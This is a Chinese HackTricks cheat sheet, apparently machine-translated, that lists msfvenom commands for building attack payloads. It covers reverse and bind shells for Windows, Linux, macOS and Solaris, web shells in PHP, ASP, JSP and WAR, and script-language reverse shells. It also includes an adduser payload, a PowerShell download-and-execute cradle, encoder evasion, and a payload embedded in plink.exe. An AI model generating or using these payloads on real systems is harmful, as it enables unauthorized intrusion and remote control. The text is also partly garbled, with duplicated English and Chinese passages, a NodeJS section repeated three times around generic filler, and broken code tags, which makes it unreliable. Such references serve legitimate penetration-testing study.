# MSFVenom - 速查表

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在 HackTricks 中看到你的**公司广告**吗？或者你想获得**PEASS 的最新版本或下载 HackTricks 的 PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass)，或者**关注**我在**推特**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享你的黑客技巧。**

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof 是所有加密漏洞赏金的家园。**

**无需等待即可获得奖励**\
HackenProof 的赏金只有在客户存入奖励预算后才会启动。在漏洞验证后，您将获得奖励。

**在 web3 渗透测试中积累经验**\
区块链协议和智能合约是新的互联网！在它崛起的日子里掌握 web3 安全。

**成为 web3 黑客传奇**\
每次验证的漏洞都会获得声望积分，并占领每周排行榜的榜首。

[**在 HackenProof 上注册**](https://hackenproof.com/register) 开始从您的黑客攻击中获利！

{% embed url="https://hackenproof.com/register" %}

***

## 基本的 msfvenom

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

也可以使用 `-a` 来指定架构或 `--platform`

## 列表
```bash
msfvenom -l payloads #Payloads
msfvenom -l encoders #Encoders
```
## 创建 shellcode 时常见的参数

When creating a shellcode, there are several common parameters that can be used:

创建 shellcode 时，可以使用以下几个常见参数：

- **`-p`** or **`--payload`**: Specifies the payload to use. This can be a built-in payload or a custom one.

- **`-p`** 或 **`--payload`**：指定要使用的 payload。这可以是内置的 payload 或自定义的 payload。

- **`-f`** or **`--format`**: Specifies the output format of the shellcode. This can be raw, c, ruby, python, etc.

- **`-f`** 或 **`--format`**：指定 shellcode 的输出格式。可以是 raw、c、ruby、python 等。

- **`-e`** or **`--encoder`**: Specifies the encoder to use. Encoders are used to obfuscate the shellcode.

- **`-e`** 或 **`--encoder`**：指定要使用的编码器。编码器用于混淆 shellcode。

- **`-b`** or **`--bad-chars`**: Specifies any bad characters that should be avoided in the shellcode.

- **`-b`** 或 **`--bad-chars`**：指定在 shellcode 中应避免的任何不良字符。

- **`-a`** or **`--arch`**: Specifies the target architecture for the shellcode.

- **`-a`** 或 **`--arch`**：指定 shellcode 的目标架构。

- **`-o`** or **`--out`**: Specifies the output file for the generated shellcode.

- **`-o`** 或 **`--out`**：指定生成的 shellcode 的输出文件。

These parameters can be used with the `msfvenom` tool to create customized shellcode for various purposes.

这些参数可以与 `msfvenom` 工具一起使用，为各种目的创建定制的 shellcode。
```bash
-b "\x00\x0a\x0d"
-f c
-e x86/shikata_ga_nai -i 5
EXITFUNC=thread
PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
```
## **Windows**

### **反向 Shell**

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
```
### 绑定Shell

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f exe > bind.exe
```
### 创建用户

{% code overflow="wrap" %}
```bash
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
### CMD Shell

{% code overflow="wrap" %}
```bash
msfvenom -p windows/shell/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > prompt.exe
```
### **执行命令**

{% code overflow="wrap" %}
```bash
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe
msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
### 编码器

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
### 嵌入可执行文件中

{% code overflow="wrap" %}
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```
{% endcode %}

## Linux Payloads

### 反向 Shell

{% code overflow="wrap" %}
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
```
### 绑定Shell

{% code overflow="wrap" %}
```bash
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
```
{% endcode %}

### SunOS（Solaris）

{% code overflow="wrap" %}
```bash
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```
## **MAC Payloads**

### **反向 Shell:**

{% code overflow="wrap" %}
```bash
msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
```
### **绑定Shell**

{% code overflow="wrap" %}
```bash
msfvenom -p osx/x86/shell_bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f macho > bind.macho
```
{% endcode %}

## **基于Web的Payloads**

### **PHP**

#### 反向shell

{% code overflow="wrap" %}
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```
{% endcode %}

### ASP/x

#### 反向 shell

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
{% endcode %}

### JSP

#### 反向 shell

{% code overflow="wrap" %}
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
{% endcode %}

### WAR

#### 反向 Shell

{% code overflow="wrap" %}
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
{% code %}

### NodeJS

### NodeJS

NodeJS is a popular runtime environment for executing JavaScript code outside of a web browser. It allows developers to build scalable and high-performance applications using JavaScript on the server-side. NodeJS provides a rich set of built-in modules and libraries, making it easy to develop server-side applications.

NodeJS is widely used in the development of web servers, command-line tools, and desktop applications. It has a large and active community, which means there are plenty of resources and libraries available to help developers.

In the context of hacking, NodeJS can be leveraged to exploit vulnerabilities in web applications. Attackers can use NodeJS to execute malicious code, gain unauthorized access, and perform various types of attacks, such as remote code execution and data exfiltration.

To exploit vulnerabilities in NodeJS applications, attackers can use various techniques, such as injecting malicious code into the application, exploiting insecure dependencies, and leveraging misconfigurations. It is important for developers to follow secure coding practices and regularly update their dependencies to mitigate these risks.

In addition to exploiting vulnerabilities, attackers can also use NodeJS as a tool for reconnaissance and information gathering. They can leverage the built-in modules and libraries to scan for open ports, identify vulnerable services, and gather information about the target system.

Overall, NodeJS is a powerful tool for both developers and attackers. It provides a flexible and efficient environment for building applications, but it also introduces security risks if not properly secured and maintained.

### NodeJS

NodeJS 是一个流行的运行时环境，用于在网页浏览器之外执行 JavaScript 代码。它允许开发人员使用 JavaScript 在服务器端构建可扩展和高性能的应用程序。NodeJS 提供了丰富的内置模块和库，使开发服务器端应用程序变得简单。

NodeJS 在 Web 服务器、命令行工具和桌面应用程序的开发中被广泛使用。它拥有庞大而活跃的社区，这意味着有大量的资源和库可供开发人员使用。

在黑客攻击的背景下，NodeJS 可以被利用来利用 Web 应用程序中的漏洞。攻击者可以使用 NodeJS 执行恶意代码，获取未经授权的访问权限，并执行各种类型的攻击，如远程代码执行和数据泄露。

为了利用 NodeJS 应用程序中的漏洞，攻击者可以使用各种技术，如将恶意代码注入应用程序、利用不安全的依赖项和利用配置错误。开发人员应遵循安全编码实践，并定期更新其依赖项以减轻这些风险。

除了利用漏洞，攻击者还可以将 NodeJS 用作侦察和信息收集工具。他们可以利用内置的模块和库扫描开放端口，识别易受攻击的服务，并收集有关目标系统的信息。

总的来说，NodeJS 是开发人员和攻击者的强大工具。它为构建应用程序提供了灵活高效的环境，但如果不正确地进行安全保护和维护，也会引入安全风险。

{% endcode %}
```bash
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
## **脚本语言负载**

### **Perl**

{% code overflow="wrap" %}
```bash
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
{% endcode %}

### **Python**

{% code overflow="wrap" %}
```bash
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
### **Bash（命令行）**

{% code overflow="wrap" %}
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof是所有加密货币漏洞赏金的家园。**

**无需等待即可获得奖励**\
HackenProof的赏金只有在客户存入奖励预算后才会启动。在漏洞验证后，您将获得奖励。

**在web3渗透测试中积累经验**\
区块链协议和智能合约是新的互联网！在其兴起的时代掌握web3安全。

**成为web3黑客传奇**\
每次验证的漏洞都会获得声誉积分，并登上每周排行榜的榜首。

[**在HackenProof上注册**](https://hackenproof.com/register) 开始从您的黑客攻击中赚取收入！

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**

</details>
